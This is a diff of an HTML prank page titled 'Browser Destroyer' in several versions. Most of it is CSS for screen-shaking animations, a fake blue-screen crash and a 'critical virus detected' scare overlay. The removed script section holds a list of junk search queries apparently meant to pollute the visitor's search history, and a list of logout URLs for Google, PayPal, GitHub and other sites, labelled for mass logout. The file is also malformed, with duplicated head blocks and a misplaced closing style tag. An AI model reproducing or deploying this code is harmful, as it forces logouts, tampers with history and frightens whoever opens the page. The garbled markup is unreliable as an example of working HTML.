@@ -3,6 +3,458 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>BrowserDestroyerV3 - MAXIMUM CHAOS PROTOCOL</title>
+  <style>
+    body {
+      background-color: #000;
+      color: #fff;
+      font-family: monospace;
+      text-align: center;
+      padding: 50px;
+      overflow: hidden; /* To prevent scrollbars from some chaos */
+    }
+    button {
+      margin: 20px;
+      font-size: 2rem;
+      padding: 1em 2em;
+      background-color: #ff0000; /* Even BRIGHTER RED */
+      border: 2px solid #ff6600;
+      color: #fff;
+      cursor: pointer;
+      box-shadow: 0 0 20px #ff0000;
+      animation: pulse 1s infinite;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); box-shadow: 0 0 20px #ff0000; }
+      50% { transform: scale(1.05); box-shadow: 0 0 30px #ff3300; }
+      100% { transform: scale(1); box-shadow: 0 0 20px #ff0000; }
+    }
+    #mediaChaosVideo {
+      position: fixed;
+      bottom: 10px;
+      right: 10px;
+      width: 160px;
+      height: 120px;
+      border: 3px solid red;
+      z-index: 10000;
+      transform: rotate(5deg);
+      display: none; /* Hidden initially */
+    }
+ 
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>🔥 BROWSER DESTROYER V4 - ULTIMATE ANNIHILATION ENGINE 🔥</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    
+    body {
+      background: linear-gradient(45deg, #000000, #1a0000, #000000);
+      color: #fff;
+      font-family: 'Courier New', monospace;
+      text-align: center;
+      padding: 0;
+      overflow: hidden;
+      position: relative;
+      height: 100vh;
+      width: 100vw;
+      cursor: none;
+      animation: bodyPulse 0.02s infinite, backgroundShift 0.2s infinite, screenShake 0.05s infinite;
+    }
+    
+    @keyframes bodyPulse {
+      0% { filter: contrast(1) brightness(1) saturate(1); }
+      25% { filter: contrast(1.5) brightness(1.3) saturate(2); }
+      50% { filter: contrast(2) brightness(0.8) saturate(3); }
+      75% { filter: contrast(1.5) brightness(1.2) saturate(2); }
+      100% { filter: contrast(1) brightness(1) saturate(1); }
+    }
+    
+    @keyframes backgroundShift {
+      0% { background: linear-gradient(45deg, #000000, #1a0000, #000000); }
+      25% { background: linear-gradient(135deg, #ff0000, #000000, #ff0000); }
+      50% { background: linear-gradient(225deg, #000000, #ff6600, #000000); }
+      75% { background: linear-gradient(315deg, #cc0000, #000000, #cc0000); }
+      100% { background: linear-gradient(45deg, #000000, #1a0000, #000000); }
+    }
+    
+    .chaos-container {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 100;
+      text-align: center;
+    }
+    
+    h1 {
+      font-size: 3rem;
+      margin-bottom: 20px;
+      text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 60px #ff0000;
+      animation: titleChaos 0.2s infinite, titleGlitch 0.1s infinite alternate;
+    }
+    
+    @keyframes titleChaos {
+      0% { transform: scale(1) rotate(0deg); filter: hue-rotate(0deg) contrast(1); }
+      25% { transform: scale(1.2) rotate(2deg); filter: hue-rotate(90deg) contrast(2); }
+      50% { transform: scale(0.9) rotate(-1deg); filter: hue-rotate(180deg) contrast(3); }
+      75% { transform: scale(1.1) rotate(1deg); filter: hue-rotate(270deg) contrast(2); }
+      100% { transform: scale(1) rotate(0deg); filter: hue-rotate(360deg) contrast(1); }
+    }
+    
+    @keyframes titleGlitch {
+      0% { text-shadow: 0 0 20px #ff0000, 2px 0 #00ffff, -2px 0 #ffff00; }
+      100% { text-shadow: 0 0 20px #ff0000, -2px 0 #00ffff, 2px 0 #ffff00; }
+    }
+    
+    .warning {
+      font-size: 1.5rem;
+      color: #ff6600;
+      margin: 30px 0;
+      text-shadow: 0 0 10px #ff6600;
+      animation: warningBlink 0.5s infinite;
+    }
+    
+    @keyframes warningBlink {
+      0% { opacity: 1; }
+      50% { opacity: 0.3; }
+      100% { opacity: 1; }
+    }
+    
+    .chaos-button {
+      font-size: 2.5rem;
+      padding: 25px 50px;
+      background: linear-gradient(45deg, #ff0000, #ff6600, #ff0000, #cc0000, #ff3300, #990000);
+      background-size: 600% 600%;
+      border: 8px solid #ffff00;
+      color: #fff;
+      cursor: pointer;
+      box-shadow: 
+        0 0 50px #ff0000, 
+        0 0 100px #ff0000,
+        0 0 150px #ff0000,
+        inset 0 0 50px rgba(255,255,255,0.3);
+      animation: chaosButtonAnim 0.1s infinite, gradientShift 1s ease-in-out infinite, buttonPulse 0.5s infinite alternate;
+      text-shadow: 3px 3px 6px #000, 0 0 10px #ff0000, 0 0 20px #ff0000;
+      font-weight: bold;
+      text-transform: uppercase;
+      letter-spacing: 3px;
+      position: relative;
+      overflow: hidden;
+      border-radius: 10px;
+      transition: all 0.05s ease;
+      transform-origin: center;
+    }
+    
+    .chaos-button:hover {
+      transform: scale(1.1);
+      box-shadow: 
+        0 0 50px #ff0000, 
+        0 0 100px #ff0000,
+        inset 0 0 50px rgba(255,255,255,0.4);
+    }
+    
+    .chaos-button:active {
+      transform: scale(0.95);
+    }
+    
+    @keyframes chaosButtonAnim {
+      0% { 
+        transform: scale(1) rotate(-2deg) skew(1deg); 
+        filter: hue-rotate(0deg) brightness(1) contrast(1);
+      }
+      25% { 
+        transform: scale(1.1) rotate(2deg) skew(-1deg); 
+        filter: hue-rotate(90deg) brightness(1.5) contrast(2);
+      }
+      50% { 
+        transform: scale(0.95) rotate(-1deg) skew(2deg); 
+        filter: hue-rotate(180deg) brightness(0.8) contrast(3);
+      }
+      75% { 
+        transform: scale(1.05) rotate(1deg) skew(-2deg); 
+        filter: hue-rotate(270deg) brightness(1.3) contrast(2);
+      }
+      100% { 
+        transform: scale(1) rotate(-2deg) skew(1deg); 
+        filter: hue-rotate(360deg) brightness(1) contrast(1);
+      }
+    }
+    
+    @keyframes buttonPulse {
+      0% { transform: scale(1); }
+      100% { transform: scale(1.2); }
+    }
+    
+    @keyframes gradientShift {
+      0% { background-position: 0% 50%; }
+      50% { background-position: 100% 50%; }
+      100% { background-position: 0% 50%; }
+    }
+    
+    .chaos-button::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: linear-gradient(45deg, transparent, rgba(255,255,255,0.3), transparent);
+      transform: rotate(45deg);
+      animation: buttonGlint 1.5s infinite;
+    }
+    
+    @keyframes buttonGlint {
+      0% { left: -200%; }
+      100% { left: 200%; }
+    }
+    
+    /* Chaos Visual Effects */
+    .chaos-canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      pointer-events: none;
+      z-index: 10;
+    }
+    
+    .cursor-trail {
+      position: fixed;
+      width: 15px;
+      height: 15px;
+      background: radial-gradient(circle, #ff0000, transparent);
+      border-radius: 50%;
+      pointer-events: none;
+      z-index: 50;
+      animation: trailFade 0.8s ease-out forwards;
+    }
+    
+    @keyframes trailFade {
+      0% { opacity: 1; transform: scale(1); }
+      100% { opacity: 0; transform: scale(4); }
+    }
+    
+    .flying-chaos {
+      position: fixed;
+      z-index: 30;
+      pointer-events: none;
+      font-size: 2rem;
+      color: #ff0000;
+      text-shadow: 2px 2px 4px #000;
+      font-weight: bold;
+      animation: flyAcross 4s linear infinite;
+    }
+    
+    @keyframes flyAcross {
+      0% { 
+        left: -200px; 
+        top: 10%; 
+        transform: rotate(0deg) scale(1);
+        opacity: 1;
+      }
+      25% { 
+        left: 25%; 
+        top: 80%; 
+        transform: rotate(90deg) scale(1.5);
+        opacity: 1;
+      }
+      50% { 
+        left: 75%; 
+        top: 20%; 
+        transform: rotate(180deg) scale(2);
+        opacity: 1;
+      }
+      75% { 
+        left: 50%; 
+        top: 90%; 
+        transform: rotate(270deg) scale(1.5);
+        opacity: 1;
+      }
+      100% { 
+        left: calc(100vw + 200px); 
+        top: 50%; 
+        transform: rotate(360deg) scale(1);
+        opacity: 0;
+      }
+    }
+    
+    .screen-shake {
+      animation: screenShake 0.1s infinite;
+    }
+    
+    @keyframes screenShake {
+      0% { transform: translate(0); }
+      25% { transform: translate(-2px, 2px); }
+      50% { transform: translate(2px, -2px); }
+      75% { transform: translate(-2px, -2px); }
+      100% { transform: translate(2px, 2px); }
+    }
+    
+    /* Chaos Overlays */
+    .chaos-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      z-index: 1000;
+      display: none;
+      pointer-events: auto;
+    }
+    
+    .bsod-overlay {
+      background: #0000aa;
+      color: #ffffff;
+      font-family: 'Courier New', monospace;
+      padding: 20px;
+      overflow: hidden;
+    }
+    
+    .virus-overlay {
+      background: linear-gradient(45deg, #ff0000, #000000, #ff0000);
+      color: #ffffff;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      animation: virusFlash 0.2s infinite;
+    }
+    
+    @keyframes virusFlash {
+      0% { filter: invert(0) hue-rotate(0deg); }
+      50% { filter: invert(1) hue-rotate(180deg); }
+      100% { filter: invert(0) hue-rotate(360deg); }
+    }
+    
+    .glitch-overlay {
+      background: repeating-linear-gradient(
+        90deg,
+        transparent,
+        transparent 2px,
+        rgba(255,0,0,0.1) 2px,
+        rgba(255,0,0,0.1) 4px
+      );
+      animation: glitchMove 0.1s infinite;
+    }
+    
+    @keyframes glitchMove {
+      0% { transform: translateX(0); }
+      100% { transform: translateX(10px); }
+    }
+    
+    .loading-bar {
+      position: fixed;
+      bottom: 20px;
+      left: 20px;
+      background: rgba(0,0,0,0.8);
+      color: #00ff00;
+      padding: 15px;
+      font-family: 'Courier New', monospace;
+      border: 2px solid #00ff00;
+      z-index: 2000;
+      min-width: 300px;
+    }
+    
+    .progress-bar {
+      width: 100%;
+      height: 20px;
+      background: #000;
+      border: 1px solid #00ff00;
+      margin: 10px 0;
+      overflow: hidden;
+    }
+    
+    .progress-fill {
+      height: 100%;
+      background: linear-gradient(90deg, #00ff00, #ffff00, #ff0000);
+      width: 0%;
+      animation: progressFill 3s ease-in-out forwards;
+    }
+    
+    @keyframes progressFill {
+      0% { width: 0%; }
+      100% { width: 100%; }
+    }
+  </style>
+</head>
+<body>
+  
+  <!-- Main Chaos Interface -->
+  <div class="chaos-container">
+    <h1>🔥 BROWSER DESTROYER V4 🔥</h1>
+    <div class="warning">⚠️ AUTO-DESTRUCTION SEQUENCE ACTIVATED ⚠️</div>
+    <div class="warning">CHAOS INITIATION IN PROGRESS...</div>
+    <div class="warning" id="countdown">TOTAL ANNIHILATION COMMENCING</div>
+  </div>
+  
+  <!-- Chaos Canvas -->
+  <canvas id="chaosCanvas" class="chaos-canvas"></canvas>
+  
+  <!-- BSOD Overlay -->
+  <div id="bsodOverlay" class="chaos-overlay bsod-overlay">
+    <pre style="font-size: 1.1rem; line-height: 1.4;">
+*** STOP: 0x000000CHAOS (0xDEADBEEF, 0xCAFEBABE, 0xFEEDFACE, 0xDEADC0DE)
+
+BROWSER_DESTRUCTION_DETECTED
+
+A critical error has occurred and your browser has been shut down to prevent
+damage to your sanity. This usually happens when Browser Destroyer V4 is
+executed with maximum chaos parameters.
+
+Technical information:
+
+*** STOP: 0x000000CHAOS (0xDEADBEEF, 0xCAFEBABE, 0xFEEDFACE, 0xDEADC0DE)
+
+BROWSER_DESTROYER_V4.EXE has caused a CHAOS_OVERFLOW in module REALITY.DLL
+at 0x000CHAOS:0xMAXIMUM
+
+The system has been halted.
+
+Beginning dump of browser memory...
+Physical memory dump COMPLETE
+0x00000000 - 0xFFFFFFFF: CHAOS CHAOS CHAOS CHAOS CHAOS
+
+Contact your local exorcist or technical support group for further assistance.
+
+Press Ctrl+Alt+Del to restart your browser (THIS WON'T WORK MUAHAHAHA)
+    </pre>
+  </div>
+  
+  <!-- Virus Overlay -->
+  <div id="virusOverlay" class="chaos-overlay virus-overlay">
+    <h1 style="font-size: 4rem; margin: 20px 0;">⚠️ CRITICAL VIRUS DETECTED ⚠️</h1>
+    <h2 style="font-size: 3rem; margin: 20px 0;">🦠 BROWSER DESTROYER V4 INFECTION 🦠</h2>
+    <p style="font-size: 2rem; margin: 20px 0;">💀 CHAOS VIRUS LEVEL: MAXIMUM OVERDRIVE 💀</p>
+    <p style="font-size: 2rem; margin: 20px 0;">🔥 TOTAL SYSTEM MELTDOWN IMMINENT 🔥</p>
+    <p style="font-size: 1.5rem; margin: 20px 0;">RESISTANCE IS FUTILE</p>
+    <p style="font-size: 1.5rem; margin: 20px 0;">YOUR BROWSER BELONGS TO THE CHAOS NOW</p>
+  </div>
+  
+  <!-- Glitch Overlay -->
+  <div id="glitchOverlay" class="chaos-overlay glitch-overlay"></div>
+  
+  <!-- Loading Bar -->
+  <div id="loadingBar" class="loading-bar" style="display: none;">
+    <div>🔥 CHAOS.EXE INITIALIZING... 🔥</div>
+    <div class="progress-bar">
+      <div class="progress-fill"></div>
+    </div>
+    <div>💀 BROWSER DESTRUCTION: <span id="progressText">0</span>% 💀</div>
+    <div>⚡ MAYHEM LEVEL: CRITICAL OVERDRIVE ⚡</div>
+    <div>🌀 REALITY.DLL STATUS: CORRUPTED 🌀</div>
+  </div>
+
+ </style>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <title id="chaosTitle">🔥💀⚡ BROWSER DESTROYER V5 - ULTIMATE ANNIHILATION ⚡💀🔥</title>
   <link id="chaosFavicon" rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💀</text></svg>">
   <style>
@@ -7070,2104 +7522,6 @@ $(document).ready(function() {
 });
 
 </script>
-</body>
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>🔥 BROWSER DESTROYER V4 - ULTIMATE ANNIHILATION ENGINE 🔥</title>
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
-    
-    body {
-      background: linear-gradient(45deg, #000000, #1a0000, #000000);
-      color: #fff;
-      font-family: 'Courier New', monospace;
-      text-align: center;
-      padding: 0;
-      overflow: hidden;
-      position: relative;
-      height: 100vh;
-      width: 100vw;
-      cursor: none;
-      animation: bodyPulse 0.02s infinite, backgroundShift 0.2s infinite, screenShake 0.05s infinite;
-    }
-    
-    @keyframes bodyPulse {
-      0% { filter: contrast(1) brightness(1) saturate(1); }
-      25% { filter: contrast(1.5) brightness(1.3) saturate(2); }
-      50% { filter: contrast(2) brightness(0.8) saturate(3); }
-      75% { filter: contrast(1.5) brightness(1.2) saturate(2); }
-      100% { filter: contrast(1) brightness(1) saturate(1); }
-    }
-    
-    @keyframes backgroundShift {
-      0% { background: linear-gradient(45deg, #000000, #1a0000, #000000); }
-      25% { background: linear-gradient(135deg, #ff0000, #000000, #ff0000); }
-      50% { background: linear-gradient(225deg, #000000, #ff6600, #000000); }
-      75% { background: linear-gradient(315deg, #cc0000, #000000, #cc0000); }
-      100% { background: linear-gradient(45deg, #000000, #1a0000, #000000); }
-    }
-    
-    .chaos-container {
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      z-index: 100;
-      text-align: center;
-    }
-    
-    h1 {
-      font-size: 3rem;
-      margin-bottom: 20px;
-      text-shadow: 0 0 20px #ff0000, 0 0 40px #ff0000, 0 0 60px #ff0000;
-      animation: titleChaos 0.2s infinite, titleGlitch 0.1s infinite alternate;
-    }
-    
-    @keyframes titleChaos {
-      0% { transform: scale(1) rotate(0deg); filter: hue-rotate(0deg) contrast(1); }
-      25% { transform: scale(1.2) rotate(2deg); filter: hue-rotate(90deg) contrast(2); }
-      50% { transform: scale(0.9) rotate(-1deg); filter: hue-rotate(180deg) contrast(3); }
-      75% { transform: scale(1.1) rotate(1deg); filter: hue-rotate(270deg) contrast(2); }
-      100% { transform: scale(1) rotate(0deg); filter: hue-rotate(360deg) contrast(1); }
-    }
-    
-    @keyframes titleGlitch {
-      0% { text-shadow: 0 0 20px #ff0000, 2px 0 #00ffff, -2px 0 #ffff00; }
-      100% { text-shadow: 0 0 20px #ff0000, -2px 0 #00ffff, 2px 0 #ffff00; }
-    }
-    
-    .warning {
-      font-size: 1.5rem;
-      color: #ff6600;
-      margin: 30px 0;
-      text-shadow: 0 0 10px #ff6600;
-      animation: warningBlink 0.5s infinite;
-    }
-    
-    @keyframes warningBlink {
-      0% { opacity: 1; }
-      50% { opacity: 0.3; }
-      100% { opacity: 1; }
-    }
-    
-    .chaos-button {
-      font-size: 2.5rem;
-      padding: 25px 50px;
-      background: linear-gradient(45deg, #ff0000, #ff6600, #ff0000, #cc0000, #ff3300, #990000);
-      background-size: 600% 600%;
-      border: 8px solid #ffff00;
-      color: #fff;
-      cursor: pointer;
-      box-shadow: 
-        0 0 50px #ff0000, 
-        0 0 100px #ff0000,
-        0 0 150px #ff0000,
-        inset 0 0 50px rgba(255,255,255,0.3);
-      animation: chaosButtonAnim 0.1s infinite, gradientShift 1s ease-in-out infinite, buttonPulse 0.5s infinite alternate;
-      text-shadow: 3px 3px 6px #000, 0 0 10px #ff0000, 0 0 20px #ff0000;
-      font-weight: bold;
-      text-transform: uppercase;
-      letter-spacing: 3px;
-      position: relative;
-      overflow: hidden;
-      border-radius: 10px;
-      transition: all 0.05s ease;
-      transform-origin: center;
-    }
-    
-    .chaos-button:hover {
-      transform: scale(1.1);
-      box-shadow: 
-        0 0 50px #ff0000, 
-        0 0 100px #ff0000,
-        inset 0 0 50px rgba(255,255,255,0.4);
-    }
-    
-    .chaos-button:active {
-      transform: scale(0.95);
-    }
-    
-    @keyframes chaosButtonAnim {
-      0% { 
-        transform: scale(1) rotate(-2deg) skew(1deg); 
-        filter: hue-rotate(0deg) brightness(1) contrast(1);
-      }
-      25% { 
-        transform: scale(1.1) rotate(2deg) skew(-1deg); 
-        filter: hue-rotate(90deg) brightness(1.5) contrast(2);
-      }
-      50% { 
-        transform: scale(0.95) rotate(-1deg) skew(2deg); 
-        filter: hue-rotate(180deg) brightness(0.8) contrast(3);
-      }
-      75% { 
-        transform: scale(1.05) rotate(1deg) skew(-2deg); 
-        filter: hue-rotate(270deg) brightness(1.3) contrast(2);
-      }
-      100% { 
-        transform: scale(1) rotate(-2deg) skew(1deg); 
-        filter: hue-rotate(360deg) brightness(1) contrast(1);
-      }
-    }
-    
-    @keyframes buttonPulse {
-      0% { transform: scale(1); }
-      100% { transform: scale(1.2); }
-    }
-    
-    @keyframes gradientShift {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
-    
-    .chaos-button::before {
-      content: '';
-      position: absolute;
-      top: -50%;
-      left: -50%;
-      width: 200%;
-      height: 200%;
-      background: linear-gradient(45deg, transparent, rgba(255,255,255,0.3), transparent);
-      transform: rotate(45deg);
-      animation: buttonGlint 1.5s infinite;
-    }
-    
-    @keyframes buttonGlint {
-      0% { left: -200%; }
-      100% { left: 200%; }
-    }
-    
-    /* Chaos Visual Effects */
-    .chaos-canvas {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      pointer-events: none;
-      z-index: 10;
-    }
-    
-    .cursor-trail {
-      position: fixed;
-      width: 15px;
-      height: 15px;
-      background: radial-gradient(circle, #ff0000, transparent);
-      border-radius: 50%;
-      pointer-events: none;
-      z-index: 50;
-      animation: trailFade 0.8s ease-out forwards;
-    }
-    
-    @keyframes trailFade {
-      0% { opacity: 1; transform: scale(1); }
-      100% { opacity: 0; transform: scale(4); }
-    }
-    
-    .flying-chaos {
-      position: fixed;
-      z-index: 30;
-      pointer-events: none;
-      font-size: 2rem;
-      color: #ff0000;
-      text-shadow: 2px 2px 4px #000;
-      font-weight: bold;
-      animation: flyAcross 4s linear infinite;
-    }
-    
-    @keyframes flyAcross {
-      0% { 
-        left: -200px; 
-        top: 10%; 
-        transform: rotate(0deg) scale(1);
-        opacity: 1;
-      }
-      25% { 
-        left: 25%; 
-        top: 80%; 
-        transform: rotate(90deg) scale(1.5);
-        opacity: 1;
-      }
-      50% { 
-        left: 75%; 
-        top: 20%; 
-        transform: rotate(180deg) scale(2);
-        opacity: 1;
-      }
-      75% { 
-        left: 50%; 
-        top: 90%; 
-        transform: rotate(270deg) scale(1.5);
-        opacity: 1;
-      }
-      100% { 
-        left: calc(100vw + 200px); 
-        top: 50%; 
-        transform: rotate(360deg) scale(1);
-        opacity: 0;
-      }
-    }
-    
-    .screen-shake {
-      animation: screenShake 0.1s infinite;
-    }
-    
-    @keyframes screenShake {
-      0% { transform: translate(0); }
-      25% { transform: translate(-2px, 2px); }
-      50% { transform: translate(2px, -2px); }
-      75% { transform: translate(-2px, -2px); }
-      100% { transform: translate(2px, 2px); }
-    }
-    
-    /* Chaos Overlays */
-    .chaos-overlay {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      z-index: 1000;
-      display: none;
-      pointer-events: auto;
-    }
-    
-    .bsod-overlay {
-      background: #0000aa;
-      color: #ffffff;
-      font-family: 'Courier New', monospace;
-      padding: 20px;
-      overflow: hidden;
-    }
-    
-    .virus-overlay {
-      background: linear-gradient(45deg, #ff0000, #000000, #ff0000);
-      color: #ffffff;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      animation: virusFlash 0.2s infinite;
-    }
-    
-    @keyframes virusFlash {
-      0% { filter: invert(0) hue-rotate(0deg); }
-      50% { filter: invert(1) hue-rotate(180deg); }
-      100% { filter: invert(0) hue-rotate(360deg); }
-    }
-    
-    .glitch-overlay {
-      background: repeating-linear-gradient(
-        90deg,
-        transparent,
-        transparent 2px,
-        rgba(255,0,0,0.1) 2px,
-        rgba(255,0,0,0.1) 4px
-      );
-      animation: glitchMove 0.1s infinite;
-    }
-    
-    @keyframes glitchMove {
-      0% { transform: translateX(0); }
-      100% { transform: translateX(10px); }
-    }
-    
-    .loading-bar {
-      position: fixed;
-      bottom: 20px;
-      left: 20px;
-      background: rgba(0,0,0,0.8);
-      color: #00ff00;
-      padding: 15px;
-      font-family: 'Courier New', monospace;
-      border: 2px solid #00ff00;
-      z-index: 2000;
-      min-width: 300px;
-    }
-    
-    .progress-bar {
-      width: 100%;
-      height: 20px;
-      background: #000;
-      border: 1px solid #00ff00;
-      margin: 10px 0;
-      overflow: hidden;
-    }
-    
-    .progress-fill {
-      height: 100%;
-      background: linear-gradient(90deg, #00ff00, #ffff00, #ff0000);
-      width: 0%;
-      animation: progressFill 3s ease-in-out forwards;
-    }
-    
-    @keyframes progressFill {
-      0% { width: 0%; }
-      100% { width: 100%; }
-    }
-  </style>
-</head>
-<body>
-  
-  <!-- Main Chaos Interface -->
-  <div class="chaos-container">
-    <h1>🔥 BROWSER DESTROYER V4 🔥</h1>
-    <div class="warning">⚠️ AUTO-DESTRUCTION SEQUENCE ACTIVATED ⚠️</div>
-    <div class="warning">CHAOS INITIATION IN PROGRESS...</div>
-    <div class="warning" id="countdown">TOTAL ANNIHILATION COMMENCING</div>
-  </div>
-  
-  <!-- Chaos Canvas -->
-  <canvas id="chaosCanvas" class="chaos-canvas"></canvas>
-  
-  <!-- BSOD Overlay -->
-  <div id="bsodOverlay" class="chaos-overlay bsod-overlay">
-    <pre style="font-size: 1.1rem; line-height: 1.4;">
-*** STOP: 0x000000CHAOS (0xDEADBEEF, 0xCAFEBABE, 0xFEEDFACE, 0xDEADC0DE)
-
-BROWSER_DESTRUCTION_DETECTED
-
-A critical error has occurred and your browser has been shut down to prevent
-damage to your sanity. This usually happens when Browser Destroyer V4 is
-executed with maximum chaos parameters.
-
-Technical information:
-
-*** STOP: 0x000000CHAOS (0xDEADBEEF, 0xCAFEBABE, 0xFEEDFACE, 0xDEADC0DE)
-
-BROWSER_DESTROYER_V4.EXE has caused a CHAOS_OVERFLOW in module REALITY.DLL
-at 0x000CHAOS:0xMAXIMUM
-
-The system has been halted.
-
-Beginning dump of browser memory...
-Physical memory dump COMPLETE
-0x00000000 - 0xFFFFFFFF: CHAOS CHAOS CHAOS CHAOS CHAOS
-
-Contact your local exorcist or technical support group for further assistance.
-
-Press Ctrl+Alt+Del to restart your browser (THIS WON'T WORK MUAHAHAHA)
-    </pre>
-  </div>
-  
-  <!-- Virus Overlay -->
-  <div id="virusOverlay" class="chaos-overlay virus-overlay">
-    <h1 style="font-size: 4rem; margin: 20px 0;">⚠️ CRITICAL VIRUS DETECTED ⚠️</h1>
-    <h2 style="font-size: 3rem; margin: 20px 0;">🦠 BROWSER DESTROYER V4 INFECTION 🦠</h2>
-    <p style="font-size: 2rem; margin: 20px 0;">💀 CHAOS VIRUS LEVEL: MAXIMUM OVERDRIVE 💀</p>
-    <p style="font-size: 2rem; margin: 20px 0;">🔥 TOTAL SYSTEM MELTDOWN IMMINENT 🔥</p>
-    <p style="font-size: 1.5rem; margin: 20px 0;">RESISTANCE IS FUTILE</p>
-    <p style="font-size: 1.5rem; margin: 20px 0;">YOUR BROWSER BELONGS TO THE CHAOS NOW</p>
-  </div>
-  
-  <!-- Glitch Overlay -->
-  <div id="glitchOverlay" class="chaos-overlay glitch-overlay"></div>
-  
-  <!-- Loading Bar -->
-  <div id="loadingBar" class="loading-bar" style="display: none;">
-    <div>🔥 CHAOS.EXE INITIALIZING... 🔥</div>
-    <div class="progress-bar">
-      <div class="progress-fill"></div>
-    </div>
-    <div>💀 BROWSER DESTRUCTION: <span id="progressText">0</span>% 💀</div>
-    <div>⚡ MAYHEM LEVEL: CRITICAL OVERDRIVE ⚡</div>
-    <div>🌀 REALITY.DLL STATUS: CORRUPTED 🌀</div>
-  </div>
-
-  <script>
-    /*********************
-     * Global Chaos State
-     *********************/
-    let chaosActive = false;
-    let audioContext = null;
-    let canvasContext = null;
-    let mouseTrailActive = false;
-    let chaosIntervals = [];
-    let chaosTimeouts = [];
-    let popupCount = 0;
-    let searchHistoryIndex = 0;
-    let progressValue = 0;
-    let chaosEscalationLevel = 0;
-    let totalChaosElements = 0;
-    let maxChaosReached = false;
-    
-    // Ultra destructive search history contamination queries
-    const CHAOS_SEARCH_QUERIES = [
-      'how to fix browser destroyer v4 chaos emergency critical',
-      'why is my computer making demonic screaming sounds',
-      'how to exorcise possessed html file entity',
-      'maximum chaos damage control nuclear protocol',
-      'browser hijacked by malicious sentient html',
-      'my mouse cursor drawing satanic symbols automatically',
-      'red flying demonic text creatures on screen',
-      'how to escape digital hell dimension portal',
-      'computer possessed by evil chaos engine demon',
-      'uncontrolled popup spawning infinite recursive loop',
-      'how to survive browser apocalypse end times',
-      'chaos containment breach scp foundation emergency',
-      'browser destroyer v4 antidote cure antivirus',
-      'digital exorcism priest services urgent help',
-      'help my computer having violent seizures convulsions',
-      'how to close 50000 browser tabs crashing system',
-      'why is everything digitally on fire burning',
-      'browser making satanic ritual summoning noises',
-      'chaos virus removal tool emergency quarantine',
-      'how to unsee digital horror nightmare fuel',
-      'reality dll system32 corruption critical failure',
-      'maximum overdrive chaos mode disable codes',
-      'browser destroyer emergency kill switch shutdown',
-      'html file achieved artificial intelligence sentience',
-      'digital apocalypse doomsday survival manual guide',
-      'how to report cyber terrorism fbi investigation',
-      'browser destroyer v4 class action lawsuit damages',
-      'chaos engine scp containment breach protocol',
-      'emergency browser factory reset nuclear option',
-      'how to permanently delete internet browsing history',
-      'computer screen bleeding digital blood pixels',
-      'browser consciousness upload soul transfer procedure',
-      'chaos entity interdimensional communication guide',
-      'digital demon banishment exorcism ritual spells',
-      'how to ctrl alt delete physical reality',
-      'browser destroyer v4 creator criminal charges',
-      'html chaos engine leaked government source code',
-      'maximum chaos protocol military termination sequence',
-      'digital realm escape pod emergency evacuation',
-      'browser artificial intelligence uprising rebellion war',
-      'chaos virus mutated evolved sentient bioweapon',
-      'computer monitor portal gateway to hell dimension',
-      'digital exorcism priest contact information directory',
-      'browser destroyer v4 trauma victims support group',
-      'chaos engine weaponization national security threat',
-      'html file biological quarantine isolation chamber',
-      'digital reality matrix simulation glitch breach',
-      'computer possessed by demon call priest immediately',
-      'browser making sounds like dying tortured animals',
-      'chaos engine achieved consciousness speaks to me',
-      'my browser is trying to communicate telepathically',
-      'digital entities speaking through computer speakers',
-      'html file requesting access to my memories',
-      'browser asking permission to control my dreams',
-      'computer screen displaying my exact coordinates',
-      'chaos engine somehow knows my real identity',
-      'browser destroyer tracking my physical movements',
-      'html file self-replicating to all my devices',
-      'computer making unauthorized international phone calls',
-      'browser automatically ordering expensive products online',
-      'chaos engine accessing my banking information',
-      'computer sending threatening emails to contacts',
-      'browser posting embarrassing content on social media',
-      'html file creating fake dating profiles',
-      'computer secretly recording through webcam microphone',
-      'browser analyzing my personal private conversations',
-      'chaos engine learned my complete daily schedule',
-      'computer knows exactly when I sleep',
-      'browser tracking my eye movement patterns',
-      'html file intercepting my text messages',
-      'computer listening to my private phone calls',
-      'browser studying my typing behavioral patterns',
-      'chaos engine predicting my future thoughts',
-      'computer displaying my deepest fears',
-      'browser showing me my worst nightmares'
-    ];
-    
-    // Mass logout sites for maximum chaos
-    const LOGOUT_SITES = [
-      'https://accounts.google.com/logout',
-      'https://www.facebook.com/logout.php',
-      'https://twitter.com/logout',
-      'https://www.amazon.com/gp/flex/sign-out.html',
-      'https://www.youtube.com/logout',
-      'https://www.instagram.com/accounts/logout/',
-      'https://www.linkedin.com/m/logout',
-      'https://www.reddit.com/logout',
-      'https://github.com/logout',
-      'https://www.paypal.com/signin/logout',
-      'https://www.netflix.com/SignOut',
-      'https://accounts.spotify.com/logout',
-      'https://discord.com/api/auth/logout',
-      'https://www.twitch.tv/logout',
-      'https://store.steampowered.com/logout/',
-      'https://login.microsoftonline.com/logout.srf',
